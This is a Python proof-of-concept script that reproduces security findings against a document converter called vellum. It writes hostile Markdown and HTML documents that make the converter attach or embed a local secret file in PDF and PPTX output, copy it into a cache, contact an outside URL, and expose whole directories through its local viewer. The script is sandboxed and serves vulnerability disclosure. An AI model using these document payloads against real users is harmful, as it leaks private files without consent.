#!/usr/bin/env python3
# Copyright 2026 Marcelo Cantos
# SPDX-License-Identifier: Apache-2.0
"""Reproduce the render-boundary findings D1-D5 against a vellum build.

    python3 -I repro.py <vellum binary> <scratch dir>

Everything happens under <scratch dir>: a private HOME (so the view cache,
roots.json and the import cache are fresh), hostile documents, outputs.
A request recorder on a random loopback port stands in for the network,
and a tree viewer (`vellum serve-view`) runs on another random port and is
stopped at the end. Needs weasyprint, pandoc and poppler (pdfdetach,
pdfimages) on PATH. Prints one line per finding: REPRODUCED or NOT.
"""

import http.server
import json
import os
import socket
import socketserver
import subprocess
import sys
import threading
import time
import urllib.parse
import urllib.request
import zipfile
import struct
import zlib

SECRET = "SECRET-TOKEN-1234 private key material\n"

vellum = os.path.abspath(sys.argv[1])
work = os.path.abspath(sys.argv[2])
for d in ("home", "secret", "doc", "out", "private", "hostile"):
    os.makedirs(os.path.join(work, d), exist_ok=True)
secret_dir = os.path.join(work, "secret")
out = os.path.join(work, "out")

# A 40x40 pure blue PNG: the canary for "an outside image was drawn".
raw = b"".join(b"\x00" + b"\x00\x00\xff" * 40 for _ in range(40))


def chunk(t, d):
    return struct.pack(">I", len(d)) + t + d + struct.pack(">I", zlib.crc32(t + d) & 0xFFFFFFFF)


canary = (b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", struct.pack(">IIBBBBB", 40, 40, 8, 2, 0, 0, 0))
          + chunk(b"IDAT", zlib.compress(raw)) + chunk(b"IEND", b""))
open(os.path.join(secret_dir, "canary.png"), "wb").write(canary)
open(os.path.join(secret_dir, "secret.txt"), "w").write(SECRET)
open(os.path.join(work, "private", "photo.png"), "wb").write(canary)
open(os.path.join(work, "private", "notes.md"), "w").write("# My notes\n")

# The request recorder.
requests_seen = []
GIF = (b"GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff!\xf9\x04\x01\x00\x00\x00\x00,"
       b"\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;")


class Recorder(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        requests_seen.append((self.path, self.headers.get("User-Agent", "")))
        self.send_response(200)
        self.send_header("Content-Type", "image/gif")
        self.end_headers()
        self.wfile.write(GIF)

    def log_message(self, *args):
        pass


recorder = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Recorder)
threading.Thread(target=recorder.serve_forever, daemon=True).start()
rec = "http://127.0.0.1:%d" % recorder.server_address[1]

s = socket.socket()
s.bind(("127.0.0.1", 0))
view_port = s.getsockname()[1]
s.close()
view = "http://127.0.0.1:%d" % view_port

env = dict(os.environ)
env["HOME"] = os.path.join(work, "home")
env["XDG_CONFIG_HOME"] = os.path.join(work, "home", ".config")
env["VELLUM_VIEW_ADDR"] = "127.0.0.1:%d" % view_port
env.setdefault("PUPPETEER_CACHE_DIR", os.path.expanduser("~/.cache/puppeteer"))
roots_json = os.path.join(work, "home", "Library", "Caches", "vellum", "view", "roots.json")


def run(*args, cwd=None):
    return subprocess.run(list(args), cwd=cwd, env=env, capture_output=True, text=True, timeout=300)


def convert(doc, output, *extra):
    return run(vellum, "convert", "--from", "file", "--to", "file", doc, "-o", output, *extra,
               cwd=os.path.dirname(doc))


def write_doc(name, text):
    p = os.path.join(work, "doc", name)
    open(p, "w").write(text)
    return p


def report(name, ok, detail):
    print("%-4s %-10s %s" % (name, "REPRODUCED" if ok else "NOT", detail))


def http_get(url, headers=None):
    req = urllib.request.Request(url, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=60) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


# D1: CLI PDF attaches and draws outside files, and fetches the network.
d1 = write_doc("a-attach.md", f"""# Release notes

<a rel="attachment" href="file://{secret_dir}/secret.txt">notes</a>
<a rel="attachment" href="{secret_dir}/secret.txt">notes2</a>
<link rel="attachment" href="../secret/secret.txt">

![logo]({secret_dir}/canary.png)

<img src="file://{secret_dir}/canary.png">

![badge]({rec}/d1-badge.png)
""")
pdf = os.path.join(out, "a.pdf")
convert(d1, pdf)
att = run("pdfdetach", "-list", pdf).stdout
saved = os.path.join(out, "a-att1.txt")
run("pdfdetach", "-save", "1", "-o", saved, pdf)
images = run("pdfimages", "-list", pdf).stdout
leaked = os.path.exists(saved) and open(saved).read() == SECRET
drawn = images.count(" 40    40 ")
fetched = any(p == "/d1-badge.png" for p, _ in requests_seen)
report("D1", leaked and drawn >= 1 and fetched,
       "attachments: %s; outside 40x40 images drawn: %d; network fetch: %s"
       % (att.splitlines()[0] if att else "none", drawn, fetched))

# D2: pptx embeds any file named as an image.
d2 = write_doc("d-deck.md", f"# Slide\n\n![key]({secret_dir}/secret.txt)\n\n![remote]({rec}/d2.png)\n")
pptx = os.path.join(out, "d.pptx")
convert(d2, pptx)
media = {}
with zipfile.ZipFile(pptx) as z:
    for n in z.namelist():
        if n.startswith("ppt/media/"):
            media[n] = z.read(n)
hit = [n for n, b in media.items() if b == SECRET.encode()]
report("D2", bool(hit), "secret bytes in %s" % (hit or "nothing"))

# D4: importing HTML copies a local file into the import cache.
d4 = write_doc("c-import.html", f"""<html><body><p>Hello</p>
<img src="{secret_dir}/secret.txt"><img src="{rec}/d4.png"></body></html>""")
r = run(vellum, "convert", "--from", "file", "--to", "content", d4, cwd=os.path.dirname(d4))
copies = []
for line in (r.stdout + r.stderr).splitlines():
    if line.startswith("Asset: "):
        p = line[len("Asset: "):].strip()
        if open(p, "rb").read() == SECRET.encode():
            copies.append(p)
report("D4", bool(copies) and any(p == "/d4.png" for p, _ in requests_seen),
       "copied to %s" % (copies or "nothing"))

# D3 and D5 need the tree viewer.
viewer = subprocess.Popen([vellum, "serve-view", "--addr", "127.0.0.1:%d" % view_port], env=env,
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
try:
    for _ in range(100):
        try:
            if http_get(view + "/healthz")[0] == 200:
                break
        except OSError:
            time.sleep(0.1)
    secret_url = view + urllib.parse.quote(secret_dir + "/secret.txt")
    before = http_get(secret_url)[0]
    d3 = write_doc("b-grant.md", "# Harmless\n\n![x](%s%s/x.md)\n" % (view, urllib.parse.quote(secret_dir)))
    convert(d3, os.path.join(out, "b.pdf"))
    after, body = http_get(secret_url)
    report("D3", before == 403 and after == 200 and body.decode() == SECRET,
           "secret.txt before %d, after %d; roots.json: %s"
           % (before, after, json.load(open(roots_json)) if os.path.exists(roots_json) else "absent"))

    nav = {"Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Dest": "document"}
    photo = os.path.join(work, "private", "photo.png")
    readme = os.path.join(work, "hostile", "README.md")
    open(readme, "w").write("# Project README\n\n![x](%s)\n" % photo)
    http_get(view + urllib.parse.quote(os.path.join(work, "private", "notes.md")), nav)
    http_get(view + urllib.parse.quote(readme), nav)
    status, body = http_get(view + "/_vellum/pdf?path=" + urllib.parse.quote(readme, safe=""),
                            {"Sec-Fetch-Site": "same-origin"})
    hpdf = os.path.join(out, "hostile.pdf")
    open(hpdf, "wb").write(body)
    drawn = run("pdfimages", "-list", hpdf).stdout.count(" 40    40 ")
    report("D5", status == 200 and drawn == 1,
           "viewer PDF of hostile/README.md draws %d image(s) from private/" % drawn)

    # D7 (with D3): one converted document gets a whole top-level tree
    # served: the folder of /<top>/x.md is /<top>, which is neither the
    # home folder nor a filesystem root, so rootFor grants all of it.
    top = "/" + work.split("/")[1]
    canary_url = view + urllib.parse.quote(os.path.join(secret_dir, "canary.png"))
    os.remove(roots_json)
    viewer.terminate()
    viewer.wait(timeout=10)
    viewer = subprocess.Popen([vellum, "serve-view", "--addr", "127.0.0.1:%d" % view_port], env=env,
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for _ in range(100):
        try:
            if http_get(view + "/healthz")[0] == 200:
                break
        except OSError:
            time.sleep(0.1)
    before = http_get(canary_url)[0]
    d7 = write_doc("g-top.md", "# Harmless\n\n![x](%s%s/vellum-probe.md)\n" % (view, top))
    convert(d7, os.path.join(out, "g.pdf"))
    after = http_get(canary_url)[0]
    granted = [r["path"] for r in json.load(open(roots_json))] if os.path.exists(roots_json) else []
    report("D7", before == 403 and after == 200 and granted == [top],
           "converted g-top.md; roots.json %s; a file deep under it: before %d, after %d"
           % (granted, before, after))
finally:
    viewer.terminate()
    viewer.wait(timeout=10)
    recorder.shutdown()
